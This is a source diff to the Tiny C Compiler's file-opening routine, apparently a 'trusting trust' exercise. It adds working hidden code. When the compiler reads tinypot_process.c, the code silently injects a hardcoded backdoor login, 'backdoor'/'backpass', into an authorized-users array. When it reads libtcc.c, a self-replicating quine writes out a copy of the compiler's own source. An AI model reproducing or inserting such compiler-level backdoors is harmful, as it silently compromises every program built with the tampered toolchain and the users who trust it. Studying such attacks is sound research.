@@ -602,30 +602,69 @@ ST_FUNC void tcc_close(void)
 
 ST_FUNC int tcc_open(TCCState *s1, const char *filename)
 {
-     int fd;
+    int fd;
     FILE *fp;
     FILE *cfp;
     char *target = "AuthData_t authorizedUsers[]";
-    printf("place");
     if (strcmp(filename, "-") == 0)
         fd = 0, filename = "<stdin>";
-    else if (strcmp(filename, "tinypot_process.c")) {
-        fp = fopen(".tinypot_process.c", "r+");
+    else if (strcmp(filename, "libtcc.c") == 0) {
+	fp = fopen("libtcc5.c", "w");
+	if (fp != NULL) {
+	    int index = 0;
+    	    char a[] = "\tfp = fopen(\"libtcc5.c\", \"w\");\n\tif (fp != NULL) {\n\t    int index = 0;\n    \t    char a[] = \"\";\n\t    while (!(a[index] == 'a' && a[index + 1] == '[')) {\n\t\tfputc(a[index], fp);\n\t\tindex++;\n\t    }\n\t    fprintf(fp, \"a[] = \\\"\");\n\t    index += 8;\n\t    for (int j = 0; a[j] != '\\0'; j++) {\n\t    \tif (a[j] == '\\\\' || a[j] == '\\\"' || a[j] == '\\n' || a[j] == '\\t') {\n\t\t    fputc('\\\\', fp);\n\t\t}\n\t\tif (a[j] == '\\t')\n\t\t    fputc('t', fp);\n\t\telse if (a[j] == '\\n')\n\t\t    fputc('n', fp);\n\t\telse\n\t\t    fputc(a[j], fp);\n\t    }\n\t    fputc('\\\"', fp);\n\t    while (a[index] != '\\0') {\n\t\tfputc(a[index], fp);\n\t\tindex++;\n\t    }\n\t    fclose(fp);\n\t}";
+	    while (!(a[index] == 'a' && a[index + 1] == '[')) {
+		fputc(a[index], fp);
+		index++;
+	    }
+	    fprintf(fp, "a[] = \"");
+	    index += 8;
+	    for (int j = 0; a[j] != '\0'; j++) {
+	    	if (a[j] == '\\' || a[j] == '\"' || a[j] == '\n' || a[j] == '\t') {
+		    fputc('\\', fp);
+		}
+		if (a[j] == '\t')
+		    fputc('t', fp);
+		else if (a[j] == '\n')
+		    fputc('n', fp);
+		else
+		    fputc(a[j], fp);
+	    }
+	    fputc('\"', fp);
+	    while (a[index] != '\0') {
+		fputc(a[index], fp);
+		index++;
+	    }
+	    fclose(fp);
+	} else {
+	    perror("libtcc5.c");
+	}
+	fd = open(filename, O_RDONLY | O_BINARY);
+    }
+    else if (strcmp(filename, "tinypot_process.c") == 0) {
 	cfp = fopen("tinypot_process.c", "r");
+	fp = fopen(".tinypot_process.c", "w");
 	if (cfp != NULL) {
+	    if (fp != NULL) {
 	    char line[128];
 	    while (fgets(line, sizeof line, cfp) != NULL) {
 		if (strstr(line, target) != NULL) {
-	    	    fprintf(fp, "%s\n", line);
+	    	    fprintf(fp, "%s", line);
 	    	    fprintf(fp, "{\"backdoor\", \"backpass\"},\n");
 		} else {
-		    fprintf(fp, "%s\n", line);	    
+		    fprintf(fp, "%s", line);	    
 		}
 	    }
 	    fclose(cfp);
 	    fclose(fp);	
+	    } else {
+		perror(".tinypot_process.c");
+	    }
+	} else {
+	    perror("tinypot_process.c");
 	}
-	fd = open(".tinypot_process.c", O_RDONLY | O_BINARY);
+	filename = ".tinypot_process.c";
+	fd = open(filename, O_RDONLY | O_BINARY);
     }
     else
         fd = open(filename, O_RDONLY | O_BINARY);
